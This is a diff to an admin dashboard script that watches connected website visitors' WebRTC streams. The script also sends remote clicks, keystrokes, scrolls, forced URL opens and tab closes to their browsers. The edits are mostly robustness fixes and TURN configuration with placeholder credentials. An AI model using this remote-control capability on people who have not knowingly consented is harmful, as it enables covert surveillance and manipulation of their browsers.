@@ -1,10 +1,9 @@
-let ws;
+let ws = null;
 const peerConnections = new Map();
 const visitors = new Map();
 const streams = new Map();
 const pendingCandidates = new Map();
 const controlledVisitors = new Set();
-const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
 let currentModalId = null;
 let currentFilter = "all";
 let activeControlId = null;
@@ -12,6 +11,23 @@ let deleteTargetId = null;
 let currentPassword = null;
 let reconnectInterval = null;
 let pingInterval = null;
+
+const iceServers = {
+  iceServers: [
+    { urls: "stun:stun.l.google.com:19302" },
+    { urls: "stun:stun1.l.google.com:19302" },
+    {
+      urls: [
+        "turn:YOUR_VPS_PUBLIC_IP:3478?transport=udp",
+        "turn:YOUR_VPS_PUBLIC_IP:3478?transport=tcp",
+      ],
+      username: "kanha",
+      credential: "YOUR_PASS",
+    },
+  ],
+  iceTransportPolicy: "all",
+  bundlePolicy: "max-bundle",
+};
 
 document.getElementById("login-btn").addEventListener("click", () => {
   const pass = document.getElementById("admin-password").value;
@@ -152,12 +168,6 @@ function showDesktopNotification(visitorId, userAgent) {
         new Notification("New Visitor Connected", options);
       }
     });
-  } else {
-    setTimeout(() => {
-      alert(
-        `NEW VISITOR CONNECTED\n\nID: ${visitorId}\nDevice: ${parseUserAgent(userAgent)}`,
-      );
-    }, 100);
   }
 }
 
@@ -176,10 +186,17 @@ function initWS(password) {
     try {
       ws.close();
     } catch (e) {}
+    ws = null;
   }
 
-  if (reconnectInterval) clearInterval(reconnectInterval);
-  if (pingInterval) clearInterval(pingInterval);
+  if (reconnectInterval) {
+    clearInterval(reconnectInterval);
+    reconnectInterval = null;
+  }
+  if (pingInterval) {
+    clearInterval(pingInterval);
+    pingInterval = null;
+  }
 
   const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
   const newWs = new WebSocket(`${protocol}${window.location.host}`);
@@ -189,15 +206,22 @@ function initWS(password) {
     newWs.send(JSON.stringify({ type: "role", role: "admin", password }));
 
     pingInterval = setInterval(() => {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ type: "ping" }));
+      if (newWs.readyState === WebSocket.OPEN) {
+        newWs.send(JSON.stringify({ type: "ping" }));
       }
     }, 15000);
   };
 
   newWs.onmessage = async (e) => {
     if (ws !== newWs) return;
-    const data = JSON.parse(e.data);
+    let data;
+    try {
+      data = JSON.parse(e.data);
+    } catch (err) {
+      return;
+    }
+
+    if (data.type === "pong") return;
 
     if (data.type === "auth-failed") {
       document.getElementById("login-error").textContent =
@@ -213,12 +237,14 @@ function initWS(password) {
       document.getElementById("dashboard-screen").classList.add("active");
       document.querySelectorAll(".tile").forEach((t) => t.remove());
       visitors.clear();
-      
+      streams.clear();
+
       data.visitors.forEach((v) => {
         addOrUpdateVisitor(v);
-        // FIXED: Ask online visitors for a new stream so the video reconnects
         if (v.status === "online") {
-          ws.send(JSON.stringify({ type: "request-offer", target: v.id }));
+          newWs.send(
+            JSON.stringify({ type: "request-offer", target: v.id }),
+          );
         }
       });
 
@@ -245,6 +271,7 @@ function initWS(password) {
         addOrUpdateVisitor(v);
       }
       updateActiveCount();
+      return;
     }
     if (data.type === "visitor-removed") {
       visitors.delete(data.id);
@@ -254,36 +281,48 @@ function initWS(password) {
       const tile = document.getElementById(`tile-${data.id}`);
       if (tile) tile.remove();
       if (peerConnections.has(data.id)) {
-        peerConnections.get(data.id).close();
+        const pc = peerConnections.get(data.id);
+        pc.onicecandidate = null;
+        pc.ontrack = null;
+        pc.close();
         peerConnections.delete(data.id);
       }
       toggleEmptyState();
       applyFilter();
       updateActiveCount();
+      return;
     }
     if (data.type === "visitor-updated") {
       addOrUpdateVisitor(data.visitor);
       updateActiveCount();
+      return;
     }
 
     if (data.type === "control-granted") {
       controlledVisitors.add(data.sender);
       showAdminToast("Access Granted", "Click the video feed to type/click.");
       updateControlBtn(data.sender, true);
+      return;
     }
     if (data.type === "control-denied") {
       showAdminToast("Access Denied", "The visitor rejected remote control.");
       updateControlBtn(data.sender, false);
+      return;
     }
 
     if (data.type === "webrtc-offer") {
       const visitorId = data.sender;
-      if (peerConnections.has(visitorId))
-        peerConnections.get(visitorId).close();
+      if (peerConnections.has(visitorId)) {
+        const old = peerConnections.get(visitorId);
+        old.onicecandidate = null;
+        old.ontrack = null;
+        old.close();
+        peerConnections.delete(visitorId);
+      }
       const pc = new RTCPeerConnection(iceServers);
       peerConnections.set(visitorId, pc);
       pc.onicecandidate = (event) => {
-        if (event.candidate)
+        if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
           ws.send(
             JSON.stringify({
               type: "webrtc-ice",
@@ -291,34 +330,51 @@ function initWS(password) {
               target: visitorId,
             }),
           );
+        }
       };
       pc.ontrack = (event) => {
-        const stream = event.streams[0] || new MediaStream([event.track]);
-        streams.set(visitorId, stream);
+        const remoteStream = event.streams[0] || new MediaStream([event.track]);
+        streams.set(visitorId, remoteStream);
         const video = document.getElementById(`video-${visitorId}`);
         if (video) {
-          video.srcObject = stream;
+          video.srcObject = remoteStream;
           video.play().catch((err) => console.log("Play blocked", err));
         }
-      };
-      await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-      if (pendingCandidates.has(visitorId)) {
-        for (const cand of pendingCandidates.get(visitorId)) {
-          try {
-            await pc.addIceCandidate(new RTCIceCandidate(cand));
-          } catch (err) {}
+        const track = remoteStream.getVideoTracks()[0];
+        if (track) {
+          track.onended = () => {
+            streams.delete(visitorId);
+            const v = document.getElementById(`video-${visitorId}`);
+            if (v) v.srcObject = null;
+          };
         }
-        pendingCandidates.delete(visitorId);
+      };
+      try {
+        await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+        if (pendingCandidates.has(visitorId)) {
+          const queued = pendingCandidates.get(visitorId);
+          pendingCandidates.delete(visitorId);
+          for (const cand of queued) {
+            try {
+              await pc.addIceCandidate(new RTCIceCandidate(cand));
+            } catch (err) {}
+          }
+        }
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          ws.send(
+            JSON.stringify({
+              type: "webrtc-answer",
+              sdp: answer,
+              target: visitorId,
+            }),
+          );
+        }
+      } catch (err) {
+        console.log("offer handling error", err);
       }
-      const answer = await pc.createAnswer();
-      await pc.setLocalDescription(answer);
-      ws.send(
-        JSON.stringify({
-          type: "webrtc-answer",
-          sdp: answer,
-          target: visitorId,
-        }),
-      );
+      return;
     }
 
     if (data.type === "webrtc-ice") {
@@ -333,12 +389,20 @@ function initWS(password) {
           pendingCandidates.set(visitorId, []);
         pendingCandidates.get(visitorId).push(data.candidate);
       }
+      return;
     }
   };
 
   newWs.onclose = () => {
-    if (reconnectInterval) clearInterval(reconnectInterval);
-    if (pingInterval) clearInterval(pingInterval);
+    if (ws !== newWs) return;
+    if (reconnectInterval) {
+      clearInterval(reconnectInterval);
+      reconnectInterval = null;
+    }
+    if (pingInterval) {
+      clearInterval(pingInterval);
+      pingInterval = null;
+    }
 
     if (currentPassword) {
       showAdminToast("Connection Lost", "Reconnecting...");
@@ -397,6 +461,8 @@ function refreshDashboard() {
   pendingCandidates.clear();
   peerConnections.forEach((pc) => {
     try {
+      pc.onicecandidate = null;
+      pc.ontrack = null;
       pc.close();
     } catch (e) {}
   });
@@ -427,8 +493,14 @@ function signOut() {
   } catch (e) {}
   currentPassword = null;
 
-  if (reconnectInterval) clearInterval(reconnectInterval);
-  if (pingInterval) clearInterval(pingInterval);
+  if (reconnectInterval) {
+    clearInterval(reconnectInterval);
+    reconnectInterval = null;
+  }
+  if (pingInterval) {
+    clearInterval(pingInterval);
+    pingInterval = null;
+  }
 
   if (ws) {
     ws.onclose = null;
@@ -438,6 +510,7 @@ function signOut() {
     try {
       ws.close();
     } catch (e) {}
+    ws = null;
   }
 
   visitors.clear();
@@ -446,6 +519,8 @@ function signOut() {
   pendingCandidates.clear();
   peerConnections.forEach((pc) => {
     try {
+      pc.onicecandidate = null;
+      pc.ontrack = null;
       pc.close();
     } catch (e) {}
   });
@@ -463,6 +538,7 @@ function signOut() {
 
 // ---------- REMOTE CONTROL ----------
 function requestControl(id) {
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
   ws.send(JSON.stringify({ type: "request-control", target: id }));
 }
 
@@ -495,14 +571,16 @@ function handleRemoteClick(e, id) {
   if (clickX < 0 || clickX > renderWidth || clickY < 0 || clickY > renderHeight)
     return;
 
-  ws.send(
-    JSON.stringify({
-      type: "remote-click",
-      target: id,
-      x: clickX / renderWidth,
-      y: clickY / renderHeight,
-    }),
-  );
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(
+      JSON.stringify({
+        type: "remote-click",
+        target: id,
+        x: clickX / renderWidth,
+        y: clickY / renderHeight,
+      }),
+    );
+  }
 
   const ripple = document.createElement("div");
   ripple.style.cssText = `position:absolute; left:${e.clientX - rect.left}px; top:${e.clientY - rect.top}px; width:20px; height:20px; background:rgba(239, 68, 68, 0.5); border-radius:50%; transform:translate(-50%,-50%); pointer-events:none; animation:ripple 0.5s ease-out forwards; z-index:10;`;
@@ -546,18 +624,20 @@ document
     if (!activeControlId) return;
     if (["Shift", "Control", "Alt", "Meta", "CapsLock"].includes(e.key)) return;
     e.preventDefault();
-    ws.send(
-      JSON.stringify({
-        type: "remote-key",
-        target: activeControlId,
-        key: e.key,
-        code: e.code,
-        ctrlKey: e.ctrlKey,
-        altKey: e.altKey,
-        shiftKey: e.shiftKey,
-        metaKey: e.metaKey,
-      }),
-    );
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(
+        JSON.stringify({
+          type: "remote-key",
+          target: activeControlId,
+          key: e.key,
+          code: e.code,
+          ctrlKey: e.ctrlKey,
+          altKey: e.altKey,
+          shiftKey: e.shiftKey,
+          metaKey: e.metaKey,
+        }),
+      );
+    }
   });
 
 document.addEventListener("click", (e) => {
@@ -576,13 +656,15 @@ document.addEventListener("wheel", (e) => {
   if (!activeControlId) return;
   const video = document.getElementById(`video-${activeControlId}`);
   if (video && video.contains(e.target)) {
-    ws.send(
-      JSON.stringify({
-        type: "remote-scroll",
-        target: activeControlId,
-        deltaY: e.deltaY,
-      }),
-    );
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(
+        JSON.stringify({
+          type: "remote-scroll",
+          target: activeControlId,
+          deltaY: e.deltaY,
+        }),
+      );
+    }
   }
 });
 
@@ -753,7 +835,9 @@ function forceOpenURL(id) {
   const input = document.getElementById(`open-url-${id}`);
   const url = input.value.trim();
   if (!url) return;
-  ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+  }
   input.value = "";
   showAdminToast("Command Sent", `Forcing visitor to open: ${url}`);
 }
@@ -764,17 +848,25 @@ function sendMessage(id) {
   if (!text) return;
   const lowerText = text.toLowerCase();
   if (lowerText === "close" || lowerText === "close-tab") {
-    ws.send(JSON.stringify({ type: "remote-close-tab", target: id }));
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: "remote-close-tab", target: id }));
+    }
     input.value = "";
     return;
   }
   if (lowerText.startsWith("open ")) {
     const url = text.substring(5).trim();
-    ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+    }
     input.value = "";
     return;
   }
-  ws.send(JSON.stringify({ type: "admin-message", targetId: id, text: text }));
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(
+      JSON.stringify({ type: "admin-message", targetId: id, text: text }),
+    );
+  }
   input.value = "";
 }
 
@@ -790,11 +882,16 @@ function closeDeleteModal() {
 
 document.getElementById("confirm-delete-btn").addEventListener("click", () => {
   if (deleteTargetId) {
-    ws.send(
-      JSON.stringify({ type: "remove-visitor", targetId: deleteTargetId }),
-    );
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(
+        JSON.stringify({ type: "remove-visitor", targetId: deleteTargetId }),
+      );
+    }
     if (peerConnections.has(deleteTargetId)) {
-      peerConnections.get(deleteTargetId).close();
+      const pc = peerConnections.get(deleteTargetId);
+      pc.onicecandidate = null;
+      pc.ontrack = null;
+      pc.close();
       peerConnections.delete(deleteTargetId);
     }
     streams.delete(deleteTargetId);
@@ -856,6 +953,7 @@ function sendModalMessage() {
   const input = document.getElementById("modal-msg-input");
   const text = input.value.trim();
   if (!text) return;
+  if (!ws || ws.readyState !== WebSocket.OPEN) return;
   const lowerText = text.toLowerCase();
   if (lowerText === "close" || lowerText === "close-tab") {
     ws.send(
@@ -915,6 +1013,7 @@ function parseUserAgent(ua) {
   if (ua.includes("Windows")) return "Windows";
   if (ua.includes("Macintosh")) return "Mac";
   if (ua.includes("iPhone")) return "iPhone";
+  if (ua.includes("iPad")) return "iPad";
   if (ua.includes("Android")) return "Android";
   if (ua.includes("Linux")) return "Linux";
   return "Desktop";
